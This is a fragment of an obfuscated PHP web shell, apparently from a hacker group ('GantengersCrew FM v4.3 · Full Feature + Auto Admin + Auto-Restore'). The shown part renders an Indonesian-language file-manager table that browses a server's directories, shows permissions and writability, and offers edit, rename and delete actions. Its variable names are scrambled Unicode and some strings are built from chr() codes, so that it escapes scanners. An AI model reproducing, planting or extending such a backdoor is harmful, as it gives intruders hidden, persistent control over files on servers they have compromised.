<table>
    <tr><th style="width:50%">Nama</th><th style="width:100px">Ukuran</th><th style="width:90px">Perm</th><th style="width:130px">Waktu</th><th>Aksi</th></tr>

    <?php if ($㉁ぁ̆ !== '/'): ?>
        <tr><td colspan="5"><a href="?path=<?=urlencode(dirname($㉁ぁ̆))?>">📂 .. (naik)</a></td></tr>
    <?php endif; ?>

    <?php
    $ﬔ㉉ﾚ̆̌́̅ = @scandir($㉁ぁ̆);
    if ($ﬔ㉉ﾚ̆̌́̅):
        $㲁㌁̧ = []; $ᛃㄉ̆ㄉ̨̇ = [];
        foreach ($ﬔ㉉ﾚ̆̌́̅ as $ﬅ̨́̋̃) {
            if ($ﬅ̨́̋̃ === '.' || $ﬅ̨́̋̃ === '..') continue;
            if (!$ㄉ㈲̄ && $ﬅ̨́̋̃[0] === '.') continue;
            $ᚨ̥̂ = $㉁ぁ̆ . '/' . $ﬅ̨́̋̃;
            if (is_dir($ᚨ̥̂)) $㲁㌁̧[] = $ﬅ̨́̋̃;
            else $ᛃㄉ̆ㄉ̨̇[] = $ﬅ̨́̋̃;
        }
        sort($㲁㌁̧); sort($ᛃㄉ̆ㄉ̨̇);
        $ᛗ̣̩㈲ᚠ̦̂ = $ぁ̤̤̃̋̆ ? array_merge($ᛃㄉ̆ㄉ̨̇, $㲁㌁̧) : array_merge($㲁㌁̧, $ᛃㄉ̆ㄉ̨̇);
        foreach ($ᛗ̣̩㈲ᚠ̦̂ as $ﬅ̨́̋̃):
            $ᚨ̥̂ = $㉁ぁ̆ . '/' . $ﬅ̨́̋̃;
            $ま́́ᛜ̦̀ = is_dir($ᚨ̥̂);
            $ﬖ㉆̊㉆̌ = $ま́́ᛜ̦̀ ? 0 : @filesize($ᚨ̥̂);
            $ᛊﾝ̊ﬗ̄́̇ = $ま́́ᛜ̦̀ ? 'DIR' : hs($ﬖ㉆̊㉆̌);
            $㦁̥ᛚ̇ = @substr(sprintf('%o', @fileperms($ᚨ̥̂)), -4);
            $㉆̤́̈̀̀ = @date(chr(89).chr(45).chr(109).chr(45).chr(100).chr(32).chr(72).chr(58).chr(105), @filemtime($ᚨ̥̂));
            $ﬕᛒﾝ㼁ᛉ̥̊ = $ま́́ᛜ̦̀ ? '📁' : '📄';
            $え̃̂̆ = @is_writable($ᚨ̥̂) ? 'wr' : (@is_readable($ᚨ̥̂) ? 'rd' : 'nn');
            $ﬔ㉁̨ = ($ﬅ̨́̋̃[0] === '.');
    ?>
        <tr>
            <td>
                <?php if ($ま́́ᛜ̦̀): ?>
                    <span class="icon"><?=$ﬕᛒﾝ㼁ᛉ̥̊?></span><a href="?path=<?=urlencode($ᚨ̥̂)?>"><?=htmlspecialchars($ﬅ̨́̋̃)?></a>
                <?php else: ?>
                    <span class="icon"><?=$ﬕᛒﾝ㼁ᛉ̥̊?></span><span class="<?=$ﬔ㉁̨ ? chr(104).chr(105).chr(100).chr(100).chr(101).chr(110).chr(45).chr(102).chr(105).chr(108).chr(101) : ''?>"><?=htmlspecialchars($ﬅ̨́̋̃)?></span>
                    <?php if ($ﬖ㉆̊㉆̌ === 0): ?> <span class="badge nn">0KB</span><?php endif; ?>
                <?php endif; ?>
            </td>
            <td class="dim"><?=$ᛊﾝ̊ﬗ̄́̇?></td>
            <td><span class="badge <?=$え̃̂̆?>"><?=$㦁̥ᛚ̇?></span></td>
            <td class="dim"><?=$㉆̤́̈̀̀?></td>
            <td>
                <?php if (!$ま́́ᛜ̦̀): ?>
                    <a href="?path=<?=urlencode($㉁ぁ̆)?>&tool=edit&item=<?=urlencode($ᚨ̥̂)?>" class="btn btn-sm btn-blue">✏ Edit</a>
                <?php endif; ?>
                <a href="?path=<?=urlencode($㉁ぁ̆)?>&rename=<?=urlencode($ᚨ̥̂)?>" class="btn btn-sm btn-gray">📝</a>
                <a href="?path=<?=urlencode($㉁ぁ̆)?>&act=del&item=<?=urlencode($ᚨ̥̂)?>" class="btn btn-sm btn-red" onclick="return confirm('Hapus <?=htmlspecialchars(addslashes($ﬅ̨́̋̃))?>?')">🗑</a>
            </td>
        </tr>
    <?php endforeach; else: ?>
        <tr><td colspan="5" class="dim">Folder kosong atau tidak bisa dibaca.</td></tr>
    <?php endif; ?>
</table>

<div class="box" style="text-align:center;margin-top:15px;padding:12px">
    <span class="dim">GantengersCrew FM v4.3 · Full Feature + Auto Admin + Auto-Restore</span>
</div>

